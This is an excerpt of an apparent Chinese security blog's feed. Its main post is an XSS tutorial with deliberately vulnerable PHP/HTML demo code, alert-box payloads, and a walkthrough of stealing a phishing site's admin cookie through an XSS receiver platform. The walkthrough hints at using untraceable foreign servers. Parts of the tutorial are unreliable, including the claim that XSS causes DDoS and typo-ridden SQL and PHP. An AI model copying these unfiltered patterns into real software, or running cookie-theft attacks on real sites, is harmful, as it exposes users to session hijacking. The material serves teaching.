    <category term="数据结构" scheme="http://chalnl.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="数据结构" scheme="http://chalnl.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="C语言" scheme="http://chalnl.com/tags/C%E8%AF%AD%E8%A8%80/"/>
    
    <category term="线性表" scheme="http://chalnl.com/tags/%E7%BA%BF%E6%80%A7%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>XSS攻击</title>
    <link href="http://chalnl.com/post/7937.html/"/>
    <id>http://chalnl.com/post/7937.html/</id>
    <published>2022-08-17T16:00:00.000Z</published>
    <updated>2022-10-01T10:00:08.027Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>目标网站上注入JavaScript脚本 - - &gt; 跨站脚本攻击</p></blockquote><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><ul><li><p><strong>XSS 介绍</strong><br>Cross-Site Scripting (<strong>跨站脚本攻击</strong>）简称XSS，是一种代码注入攻击。攻击者通过<strong>在目标网站上注入恶意脚本，使之在用户的浏览器上运行</strong>。利用这些恶意脚本，攻击者可获取用户的敏感信息如Cookie、SessionID等，进而危害数据安全。</p></li><li><p>我们常看到某某被 DDOS 攻击  就是 XXS 发送非常多的请求造成后端功能瘫痪<br>DDOS - - &gt; 操作后端代码及性能<br>XXS - - &gt; JS - - &gt; 发送网络请求</p></li><li><p><strong>XSS 原理</strong><br>XSS攻击指黑客通过特殊的手段往网页中插入了恶意的<strong>JavaScript脚本</strong>，从而在用户浏览网页时，对用户浏览器发起<strong>Cookie资料窃取、会话劫持、钓鱼欺骗</strong>等各攻击。<br>XSS跨站脚本攻击本身对Web服务器没有直接危害，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意URL，当受害者在Web浏览器中打开该URL的时侯，恶意脚本会在受害者的计算机上悄悄执行。</p></li></ul><p>XSS跨站脚本攻击漏洞也是OWASP Top 10中经常出现的对象，造成XSS漏洞普遍流行的原因如下:</p><ol><li><strong>Web浏览器</strong>本身的设计不安全，<strong>无法判断JS代码是否是恶意</strong>的</li><li>输入与输出的<strong>Web应用程序基本交互防护不够</strong></li><li>程序员++缺乏安全意识++，++缺少对XSS漏洞的认知++</li><li>XSS触发简单,完全防御起来相当困难</li></ol><ul><li>小彩蛋<br>看到黑客的钓鱼网站了 输入密码 <code>&lt;script&gt;alert(&#39;SB Hacker&#39;);&lt;/script&gt;</code> 将 script脚本 嵌入到网页中 恶心对方一下<br>如果被限制长度了别忘了 F12 改一下<br><img src="https://tva1.sinaimg.cn/large/008s52kYly1h57bd9i1jyj30y8074dgl.jpg" alt="image.png"></li></ul><h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h3 id="反射型-XSS-（非持久型）"><a href="#反射型-XSS-（非持久型）" class="headerlink" title="反射型 XSS （非持久型）"></a>反射型 XSS （非持久型）</h3><p>反射型跨站脚本(Reflected Cross-site Scripting)也称作非持久型、参数型跨站脚本。反射型XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说，黑客往往需要诱使用户“点击”一个恶意链接，才能攻击成功。</p><ul><li>假设一个页面把用户输入的参数直接输出到页面上:<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = <span class="variable">$_GET</span> [<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;&quot;</span>.<span class="variable">$input</span>. <span class="string">&quot;&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>用户向param提交的数据会展示到 <code>&lt;h1&gt;</code> 的标签中展示出来，比如提交:<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>/test.php?param=Hello xss</span><br></pre></td></tr></table></figure>会得到如下结果：<br><img src="https://tva1.sinaimg.cn/large/008s52kYly1h57fu8jzldj30m50630tl.jpg" alt="image.png"></li></ul><p>此时查看页面源代码，可以看到：<br><code>&lt;h1&gt;Hello XSS&lt;/h1&gt;</code></p><p>此时如果提交一个JavaScript代码:<br><code>http://127.0.0.1/test.php?param=&lt;script&gt;alert(233)&lt;/script&gt;</code></p><p>会发现， alert(233) 在当亲页面执行了：<br><img src="https://tva1.sinaimg.cn/large/008s52kYly1h57fxn6p7zj30mb09iab7.jpg" alt="image.png"></p><p>再查看源代码：<br><code>&lt;h1&gt;&lt;script&gt;alert(233)&lt;/script&gt;&lt;/h1&gt;</code></p><p>用户输入的Script脚本，已经被写入页面中，这个就是一个最经典的反射型XSS，它的特点是只在用户浏览时触发，而且只执行一次，非持久化，所以称为反射型XSS。反射型XSS的危害往往不如持久型XSS，因为恶意代码暴露在URL参数中，并且时刻要求目标用户浏览方可触发，稍微有点安全意识的用户可以轻易看穿该链接是不可信任的。如此一来，反射型XSS的攻击成本要比持k型XSS高得多，不过随着技术的发展，我们可以将包含漏洞的链接通过短网址缩短或者转换为二维码等形式灵活运用。</p><h3 id="存储-XSS-持久型-多存放于数据库"><a href="#存储-XSS-持久型-多存放于数据库" class="headerlink" title="存储 XSS (持久型 多存放于数据库)"></a>存储 XSS (持久型 多存放于数据库)</h3><p>存储型 XSS 和反射型 XSS 的差别仅在于∶提交的 XSS 代码会存储在服务端〈不管是数据库、内存还是文件系统等)，下次请求目标页面时不用再提交 XSS 代码。最典型的例子是留言板 XSS 。</p><p>为了复现存储型 XSS ，这里我们得用到数据库，本地新建一个名字叫做 XSS 的数据库，里面新建一个<code>message</code>表，用来存放用户的留言信息，字段名分别是 <code>id . username .message</code></p><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h57g6p36a7j30ih09ntbf.jpg" alt="image.png"></p><p>id 设为主键，并勾选自动递增，也可以参考下面的 sql语句来设计表: <strong>导入数据库注意编码问题</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> NAMES utf8mb4;</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span>`message<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">CREATE TABLE &#x27;</span>message`(</span><br><span class="line"> `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line"> <span class="string">&#x27;username’ varchar(255)CHARACTER SET utf8 COLLATE utf8_general_ci NLL DEFAULT NOLL,</span></span><br><span class="line"><span class="string"> &#x27;</span>message’ <span class="type">varchar</span>(<span class="number">255</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line"> <span class="keyword">PRIMARY</span> KEY (`id`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE <span class="operator">=</span> MyISAM AUTO_INCREMENT <span class="operator">=</span> <span class="number">17</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> <span class="operator">=</span> utf8 <span class="keyword">COLLATE</span> <span class="operator">=</span> utf8_general_ci ROw_F</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY__CHECKS <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure></p><p>目前数据库方面设计完了，开始着手写 PHP 后端页面，来复现一下存储型 XSS 漏洞:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  <span class="comment">//不报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*数据库信息配置*/</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;localhost&quot;</span> ;<span class="comment">//数据库地址</span></span><br><span class="line"><span class="variable">$port</span> = <span class="string">&quot;3306&quot;</span>;      <span class="comment">//数据库端口</span></span><br><span class="line"><span class="variable">$user</span> = <span class="string">&quot;root&quot;</span>;      <span class="comment">//数据库用户名</span></span><br><span class="line"><span class="variable">$pwd</span> = <span class="string">&quot;root&quot;</span>;       <span class="comment">//数据库密码</span></span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;xss&quot;</span>;     <span class="comment">//数据库名</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>( <span class="variable">$host</span>,<span class="variable">$user</span> , <span class="variable">$pwd</span> , <span class="variable">$dbname</span> , <span class="variable">$port</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!--前端用户输入表单--&gt;</span><br><span class="line">&lt;h1&gt;留言板的存储型XSS&lt;/h1&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> placeholder=<span class="string">&quot;姓名&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;message&quot;</span> placeholder=<span class="string">&quot;请输入您的留言&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*直接将留言插入到数据库中*/</span></span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$message</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$username</span> <span class="keyword">and</span> <span class="variable">$message</span>)</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="variable">$sql</span>=<span class="string">&quot;INSERT INTO ‘message&#x27;(&#x27;username&#x27;,&#x27;message&#x27;) VALUES (&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$messag&#125;</span>`)</span></span><br><span class="line"><span class="string">        if (<span class="subst">$conn</span>-&gt;query(<span class="subst">$sql</span>) === TRUE)&#123;</span></span><br><span class="line"><span class="string">            echo&quot;</span>留言成功<span class="string">&quot;. &quot;</span>&lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">       &#125; else &#123;</span></span><br><span class="line"><span class="string">           echo &quot;</span><span class="built_in">Error</span>: <span class="string">&quot; . <span class="subst">$sql</span> . &quot;</span>&lt;br&gt;<span class="string">&quot; . <span class="subst">$conn</span>-&gt;error;</span></span><br><span class="line"><span class="string">       )</span></span><br><span class="line"><span class="string">    &#125;else&#123;</span></span><br><span class="line"><span class="string">    echo&quot;</span>请填写完整信息<span class="string">&quot;.&quot;</span>&lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /*查询数据库中的留言信息*/</span></span><br><span class="line"><span class="string">    <span class="subst">$sql</span> = &quot;</span>SELECT username,message FROM message<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    <span class="subst">$result</span> = <span class="subst">$conn</span>-&gt;query(<span class="subst">$sql</span>);</span></span><br><span class="line"><span class="string">    if (<span class="subst">$result</span>-&gt;num_rows &gt; 0)&#123;</span></span><br><span class="line"><span class="string">       while(<span class="subst">$row</span> = <span class="subst">$result</span>-&gt;fetch_assoc()) &#123;</span></span><br><span class="line"><span class="string">          echo &quot;</span>用户名: <span class="string">&quot; .<span class="subst">$row</span>[ &quot;</span>username<span class="string">&quot;].&quot;</span>留言内容:<span class="string">&quot; . <span class="subst">$row</span> [ &quot;</span>message<span class="string">&quot; ] . &quot;</span>&lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        &#125; </span></span><br><span class="line"><span class="string">    &#125;else &#123;</span></span><br><span class="line"><span class="string">    echo&quot;</span>暂无留言<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    ?&gt;</span></span><br></pre></td></tr></table></figure></p><p>将以上代码保存为 php文件，配置好数据库连接信息，通过http服务去访问，可以得到如下界面:</p><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h57gw37z3mj30ez07pwgx.jpg" alt="image.png"></p><p>留言将会存到数据库当中</p><p>可以从代码看出，逻辑很简单，用户前端留言，就可以看到自己的留言信息了，代码中没有任何过滤，直接将用户的输入的语句插入到了html网页中，这样就很容易导致存储型xsS 漏洞的产生。<br>当攻击者直接在留言板块插入<code>&lt;script&gt;alert(&#39;鸡你太美&#39;)&lt;/script&gt;</code>，会<strong>导致这条恶意的语句直接插入到了数据库中，然后通过网页解析，成功触发了JS语句，导致用户浏览这个网页就会一直弹窗</strong>，<strong>除非从数据库中删除这条语句</strong>:</p><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h57ja1f5psj30ll0dx774.jpg" alt="image.png"></p><p>此时查看下网页源码:</p><p><code>&lt;b&gt;用户名:&lt;/b&gt;XXX――&lt;b&gt;留言内容:&lt;/b&gt;&lt;script&gt;alert( &#39;鸡你太美&#39;)&lt;/script&gt;&lt;br&gt;</code></p><p>存储型 XSS 的攻击是<strong>最隐蔽的也是危害比较大</strong>的，普通用户所看的URL为 <code>http://127.0.0.1/test.php</code> ,从URL上看均是正常的，但是当目标用户查看留言板时，那些留言的内容会从数据库查询出来并显示，浏览器发现有XSS代码，就当做正常的HTML与JS解析执行，于是就触发了XSS攻击。</p><h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><ul><li><strong>DOM型不需要后端参与</strong></li></ul><p>通过修改页面的DOM节点形成的XSS，称之为DOM XSS。它和反射型XSS、存储型XSS的差别在于，DOM XSS的XSS代码并<strong>不需要服务器解析响应的直接参与</strong>，触发XSS靠的就是浏览器端的DOM解析，可以认为<strong>完全是客户端</strong>的事情。</p><p>下面编写一个简单的含有DOM XSS漏洞的HTML代码:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;&quot;</span><span class="attr">UTF-8</span>&quot;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">xss</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="property">getElementById</span> ( <span class="string">&quot;src&quot;</span> ).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">getElementById</span> ( <span class="string">&quot;demo&quot;</span> ) .<span class="property">innerHTML</span> = <span class="string">&quot;&lt;img src=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27; /&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&lt;/ script&gt;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;src&quot;</span> <span class="attr">size</span>=<span class="string">&quot;50&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;输入图片地址&quot;</span>/&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;插入&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;xss()&quot;</span> /&gt;</span></span>&lt;br&gt;</span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><p>将输入的图片插入到 src 中生成<br>页面会通过 <img> 标签将插入的图片显示在网页中</p><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h57u55z7c8j30fm091dh5.jpg" alt="image.png"></p><p>同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候:</p><p><code>1&#39;onerror=alert(233)//</code></p><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h57u7luirsj30lt0l0af4.jpg" alt="image.png"></p><p>会直接在 <img> 标签中插入 onerror事件，该语句表示当图片加载出错的时候，自动触发后面的alert)函数，来达到弹窗的效果，这就是一个最简单的DOM型XSS漏洞。</p><ul><li><strong>漏洞出现的地方</strong><br>购物车 地址信息，网站配置文件，用户资料，论坛帖子发布，蚂蚁森林留言。<br>导致窃取cookie</li></ul><h2 id="XSS-平台"><a href="#XSS-平台" class="headerlink" title="XSS 平台"></a>XSS 平台</h2><ol><li>蓝莲花开源的 XSS<br><strong>本工具仅允许使用在CTF比赛等学习、研究场景，严禁用于非法用途</strong></li></ol><h3 id="黑进网站示例"><a href="#黑进网站示例" class="headerlink" title="黑进网站示例"></a>黑进网站示例</h3><p> ++在这演示使用上述开源平台找到 cookie 通过 XSS 漏洞黑进某个钓鱼网站++<br>根据提示注册使用，建议使用<del>国外没有备案的服务器</del>，懂的都懂</p><p>大佬写的详细博客：<a href="https://www.sqlsec.com/2020/10/xss2.html">国光的博客</a></p><ul><li><a href="https://github.com/Chalnl/BlueLotus_XSSReceiver">XSS数据接收平台</a></li></ul><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h58t6me38zj30ug0cbgpp.jpg" alt="image.png"></p><ul><li>从平台找到摸版合理使用 </li></ul><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h58tucqzi2j30z40hejzg.jpg" alt="image.png"></p><ul><li>了解他写的原理才是在重要的哦</li></ul><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h58tzbw6eej311o0l0q9z.jpg" alt="image.png"></p><p>我的JS - -&gt; 插入摸版 - - &gt; 修改网址 - - &gt; 生成paylode</p><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h58u6udy20j312x0c1wjc.jpg" alt="image.png"></p><p>将 <strong>paylode</strong> 输入到钓鱼网站，等待获取他管理页面的<strong>cookie</strong><br>(查看钓鱼网站是否有XSS漏洞可以先写于一段弹窗JS代码检验)</p><p>在接收摸版成功看到网站 cookie</p><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h58ua4428hj30r80c8gp0.jpg" alt="image.png"></p><p>获得 cookie 之后就能通过 BP 修改数据包 cookie 进入后台了<br>(后边考虑出一篇详细介绍<strong>web工作流程图</strong>，详细讲解<strong>cookie</strong>的作用)</p><ol><li><p>Kali Linux 自带的 Beef</p></li><li><p>自己动手，丰衣足食</p></li></ol><ul><li>XSS在线平台也有不少，也挺好用的<br><img src="https://tva1.sinaimg.cn/large/008s52kYly1h58svk2lfgj30xy0mdthu.jpg" alt="image.png"></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="网络安全" scheme="http://chalnl.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="网络安全" scheme="http://chalnl.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="XSS" scheme="http://chalnl.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>JAVA 反序列化漏洞</title>
    <link href="http://chalnl.com/post/3bb6ca6c.html/"/>
    <id>http://chalnl.com/post/3bb6ca6c.html/</id>
    <published>2022-08-17T06:07:05.000Z</published>
    <updated>2022-10-01T10:00:24.478Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="2509c087a6910ec486db91e82aeb31b292c9feb9305b312cfa3283f699d4c7c8"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这里有东西被加密了，需要输入密码查看哦。</summary>
    
    
    
    <category term="网络安全" scheme="http://chalnl.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="网络安全" scheme="http://chalnl.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="序列化反序列化" scheme="http://chalnl.com/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="加密内容" scheme="http://chalnl.com/tags/%E5%8A%A0%E5%AF%86%E5%86%85%E5%AE%B9/"/>
    
  </entry>
  
  <entry>
    <title>PHP 反序列化漏洞</title>
    <link href="http://chalnl.com/post/8dd96f30.html/"/>
    <id>http://chalnl.com/post/8dd96f30.html/</id>
    <published>2022-08-16T16:00:00.000Z</published>
    <updated>2022-08-19T07:00:58.707Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>PHP序列化给我们传递对象提供了一种简单的方法。将一个复杂的数据类型转换为字符串（序列化）存储在本地。在用到的时候能很方便地将硬盘上的字符串数据转换回原始的数据类型（反序列化)。</p><p>序列化的函数为 <strong>serialize</strong> (编码)</p><p>反序列化的函数为 <strong>unserialize</strong> (解码)</p><p>序列化和反序列化的目的是使得程序间<strong>传输对象会更加方便</strong>。</p><p>当 <strong>serialize</strong> 序列化对象时，PHP将试图在序列动作之前调用该对象的成员函数_sleep()，这样就允许对象在被序列化之前做任何清除操作。</p><p>类似的，<strong>当使用 unserialize() 恢复对象时</strong>，将调用 <strong>_wakeup()</strong> 成员函数。这也是PHP反序列化经典的考点， CTF  比赛中很多都是围绕着 PHP 反序列化对象的特性来突然 <strong>getshell</strong> 的，所以学习反序列化前得掌握「PHP基础的类与对象」。</p><h2 id="PHP-序列化和反序列化"><a href="#PHP-序列化和反序列化" class="headerlink" title="PHP 序列化和反序列化"></a>PHP 序列化和反序列化</h2><p>所有 PHP 里面的值都可以使用函数 serialize() 来返回一个包含字节流的字符串来表<br>示。 unserialize() 函数能够重新把字符串变回PHP原来的值。序列化一个对象将会保存对象的所有变量，但是<strong>不会保存对象的方法，只会保存类的名字</strong>。</p><p>序列化给我们传递对象提供了一种简单的方法。将一个变量的数据”转换为”字符串，但并不是类型转换，目的是将该字符串存储在本地。相反的行为称为反序列化。序列化和反序列化的目的是使得程序间传输对象会更加方便。</p><h3 id="serialize序列化"><a href="#serialize序列化" class="headerlink" title="serialize序列化"></a>serialize序列化</h3><p>将一个对象转换成一个字符串，函数描述如下:</p><p><code>serialize ( mixed $value ) : string</code></p><p>序列化实例:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">userinfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;姓名: &quot;</span>. <span class="variable language_">$this</span>-&gt;name . <span class="string">&quot;年龄:&quot;</span> . <span class="variable language_">$this</span>-&gt;age .<span class="string">&quot; \n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$jack</span> = <span class="keyword">new</span> <span class="title class_">People</span>();</span><br><span class="line"><span class="variable">$jack</span> -&gt; name = <span class="string">&quot;Jack&quot;</span>;</span><br><span class="line"><span class="variable">$jack</span> -&gt; age = <span class="number">18</span>;</span><br><span class="line"><span class="variable">$jack</span> -&gt; <span class="title function_ invoke__">userinfo</span>();   <span class="comment">//姓名:Jack年龄:18</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$jack</span>); <span class="comment">// 0:6:&quot;People&quot; :2:&#123;s :4 : &quot; name&quot; ; s :4: &quot;Jack&quot; ; s : 3: &quot;age&quot; ; i:18;&#125;</span></span><br></pre></td></tr></table></figure></p><p>其中序列化的字符串标准格式为:</p><p><code>0:类名长度:&quot;类名&quot;:属性数量:&#123;属性变量类型:属性变量长度;属性值类型:属性值长度...以此类推&#125;</code></p><p>在本次代码序列化后的具体字符串如下:</p><p><code>0:6:&quot;People&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;s:3:&quot;age&quot;;i:18;&#125;</code></p><p><code>0</code>:对象 <code>6</code>:类名长度 <code>“People&quot;</code>:类名<br><code>2</code>︰属性数量<br><code>s</code> :字符串 <code>4</code>:属性长度 <code>“name&quot;</code>:属性名 <code>s</code>:字符串 <code>4</code>:属性长度 <code>“Jack”</code>属性值<br><code>s</code> :字符串 <code>3</code>:属性长度 <code>“age”</code>:属性名 <code>i</code> :数值类型 <code>“18”</code>属性值</p><p>此外在类中的 <code>protected</code> (保护)变量和 <code>private</code>(私有）变量如果序列化的话，和<code>public</code>(公有)变量的格式稍微不太一样，具体发规则如下:</p><ul><li>protected 变量</li></ul><p><code>\x00 + * + \×00 + 变量名</code></p><ul><li>private变量<br><code>\x00 + 类名 + \×00 + 变量名</code></li></ul><p>具体看下面的实例代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span 